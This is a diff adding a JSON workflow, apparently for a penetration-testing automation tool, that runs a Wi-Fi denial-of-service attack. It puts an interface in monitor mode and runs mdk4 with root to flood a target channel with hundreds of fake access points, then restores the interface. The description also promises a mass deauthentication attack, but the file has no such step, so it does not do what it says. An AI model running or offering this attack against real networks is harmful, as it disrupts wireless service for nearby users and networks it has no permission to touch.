@@ -1,0 +1,36 @@
+{
+  "name": "wifi_dos",
+  "description": "Wi-Fi denial-of-service: beacon flood to create hundreds of fake APs + mass deauth using mdk4.",
+  "author": "james-linux",
+  "version": "1.0",
+  "requires_root": true,
+  "steps": [
+    {
+      "id": "check_kill",
+      "action": "aircrack.check_kill",
+      "description": "Kill interfering processes"
+    },
+    {
+      "id": "monitor_on",
+      "action": "aircrack.enable_monitor",
+      "params": {"interface": "{{interface}}"},
+      "description": "Enable monitor mode"
+    },
+    {
+      "id": "beacon_flood",
+      "action": "layer.run",
+      "params": {
+        "command": "timeout {{duration}} mdk4 {{monitor_interface}} b -c {{target_channel}}",
+        "timeout": 120,
+        "sudo": true
+      },
+      "description": "Beacon flood: generate hundreds of fake APs on target channel to confuse clients"
+    },
+    {
+      "id": "monitor_off",
+      "action": "aircrack.disable_monitor",
+      "params": {"interface": "{{monitor_interface}}"},
+      "description": "Restore managed mode"
+    }
+  ]
+}
